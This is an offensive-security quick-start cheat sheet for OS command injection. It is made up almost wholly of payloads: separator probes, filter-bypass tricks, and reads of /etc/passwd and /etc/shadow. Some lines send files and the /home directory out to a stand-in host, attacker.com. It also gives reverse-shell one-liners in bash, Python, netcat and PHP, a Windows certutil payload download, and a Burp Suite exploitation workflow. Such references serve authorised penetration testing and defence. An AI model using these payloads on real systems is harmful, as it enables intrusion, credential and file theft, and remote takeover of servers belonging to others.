# OS Command Injection — Quick Start

## 5-minute quick test

### 1. Time-based detection (universal)

```
input;sleep 5
input&&sleep 5
input|sleep 5
input`sleep 5`
input$(sleep 5)
%0Asleep 5
```

If response delays ~5s, command injection works. Try multiple separators — different shells / contexts allow different sets.

### 2. Output extraction

```
input;id
input&&whoami
input|cat /etc/passwd
input`hostname`
input$(uname -a)
```

Look for command output in response body.

### 3. Common detection probe

```bash
# Universal — try in this order
;sleep 5
&& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
%0a sleep 5            # newline
%0d%0a sleep 5         # CRLF
```

## Decision tree

```
Time-based works?
├── Yes — extract output to confirm
└── No — try blind via DNS/HTTP
        $(curl http://attacker.com/$(whoami))
        ;nslookup $(whoami).attacker.com
        |wget http://attacker.com/$(id)

Output reflected?
├── Yes — direct extraction
└── No — out-of-band exfil via DNS or HTTP

Special chars filtered?
├── ; filtered? → try && | || ` $()
├── Spaces filtered? → use ${IFS} or $IFS$9
├── Slashes filtered? → use base64 + decode
└── Quotes filtered? → use \x22 or skip them
```

## Universal detection payloads

```
;id
&&id
|id
`id`
$(id)
%0aid
;sleep 5
&& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
%0Asleep 5
```

## Platform-specific

**Linux:**
```
;cat /etc/passwd
;whoami
;uname -a
;ls -la /
;cat /etc/shadow                  (root only)
;curl http://attacker.com/$(whoami)
;wget --post-data="$(cat /etc/passwd)" http://attacker.com/
;bash -i >& /dev/tcp/attacker/4444 0>&1
```

**Windows:**
```
&dir
&whoami
&type C:\Windows\win.ini
&systeminfo
&powershell -enc <base64>
&certutil -urlcache -f http://attacker.com/file.exe payload.exe
```

## Bypass space filter

```
{cat,/etc/passwd}                 # brace expansion
cat$IFS/etc/passwd                # IFS variable
cat${IFS}/etc/passwd
cat<>/etc/passwd                  # redirection
$IFS$9                            # Bash IFS
```

## Bypass quote filter

```
\x22 / \x27                       # hex-escaped quotes
$'\x22'                           # ANSI-C quoting
echo -e
```

## Bypass slash filter

```
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # base64 encoding
```

## Burp Suite workflow

1. Identify input fields — file uploads, search, ping, lookup, system commands.
2. Burp Repeater → inject `;sleep 5` and observe.
3. Once confirmed, extract: `;cat /etc/passwd` then verify response.
4. For blind: `;nslookup $(whoami).burpcollaborator.net`.

## Quick enumeration commands

```bash
;id; pwd; uname -a
;ls -la / /home /tmp
;cat /etc/passwd /etc/issue
;ip a; netstat -tulnp
;ps -ef
;find / -perm -4000 2>/dev/null         # SUID
```

## File exfiltration

```bash
;cat /etc/passwd | curl -X POST -d @- http://attacker.com/exfil
;tar czf - /home | curl -X POST --data-binary @- http://attacker.com/exfil
;cp /etc/shadow /tmp/visible/
```

## Reverse shell

```bash
# Bash
;bash -i >& /dev/tcp/attacker/4444 0>&1

# Python
;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'

# Netcat
;nc -e /bin/bash attacker 4444

# PHP
<?php system("bash -i >& /dev/tcp/attacker/4444 0>&1") ?>
```

## Library patterns / mistakes / troubleshooting

**Sinks:** PHP `system()/exec()/shell_exec()/passthru()`; Python `os.system()`/`subprocess.*(shell=True)`; Node `child_process.exec()` or `spawn(...,{shell:true})`; Java `Runtime.exec(String)`/`ProcessBuilder` with shell.

**Indicators:** "ping: ..." (input reaches ping); "no such file" (separator broke path); 500 (broken syntax — simpler separator); response delay = time-based confirmed.

**Mistakes:** forgetting URL encoding (`%26`/`%7c`/`%3b`); trying `&&` when `&` filtered; bash syntax to Windows host; single quotes inside single-quoted shell.

**Troubleshooting:** no change → separator filtered (try `%0a`, `%0d%0a`); 500 only → wrap parens / backticks; output truncated → `base64`-encode output; `cat` blocked → `tac`/`head`/`tail`.

## Tools

- Burp Suite Repeater / Intruder.
- commix (`commix --url=http://target/?id=1`).
- Custom curl + bash loop.
- Burp Collaborator for blind / OAST.

## Resources

- `os-command-injection-cheat-sheet.md` — comprehensive techniques.
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE-78: OS Command Injection.
- PayloadsAllTheThings/Command Injection.
